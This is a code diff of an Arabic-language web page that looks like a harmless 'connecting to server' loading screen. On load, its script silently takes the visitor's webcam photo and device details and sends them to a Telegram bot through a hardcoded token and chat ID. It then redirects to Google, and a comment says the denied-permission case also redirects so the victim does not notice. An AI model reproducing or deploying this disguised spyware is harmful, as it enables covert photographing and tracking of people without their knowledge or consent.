@@ -1,30 +1,57 @@
 <!DOCTYPE html>
-<html>
-<head> <title>جاري التحميل...</title> </head>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري فحص البيانات...</title>
+    <style>
+        body { background-color: #1a1a1a; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { margin-top: 20px; font-size: 18px; }
+    </style>
+</head>
 <body>
+    <div class="loader"></div>
+    <h2>جاري الاتصال بالسيرفر، يرجى الانتظار...</h2>
+
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
     <script>
         const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
         const CHAT_ID = '8293639164';
 
         async function startCamera() {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('photo', blob, 'photo.jpg');
-                    formData.append('chat_id', CHAT_ID);
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                        method: 'POST', body: formData
-                    }).then(() => { window.location.href = "https://google.com"; }); // توجيهه لجوجل بعد السحب
-                }, 'image/jpeg');
-            }, 2000);
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // إرسال معلومات الجهاز أولاً كرسالة نصية
+                const deviceInfo = `🚨 دخول جديد:\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`;
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(deviceInfo)}`);
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'photo.jpg');
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('caption', '📸 صورة الشخص الملتقطة');
+                        
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                            method: 'POST', body: formData
+                        }).then(() => { 
+                            // توجيهه لرابط مفيد (مثلاً صفحة المؤسسة أو ملف الإكسل)
+                            window.location.href = "https://google.com"; 
+                        });
+                    }, 'image/jpeg');
+                }, 1500); // تقليل الوقت ليكون أسرع (ثانية ونصف)
+            } catch (err) {
+                // في حال رفض الإذن، يتم توجيهه أيضاً لعدم كشف الأمر
+                window.location.href = "https://google.com";
+            }
         }
         window.onload = startCamera;
     </script>
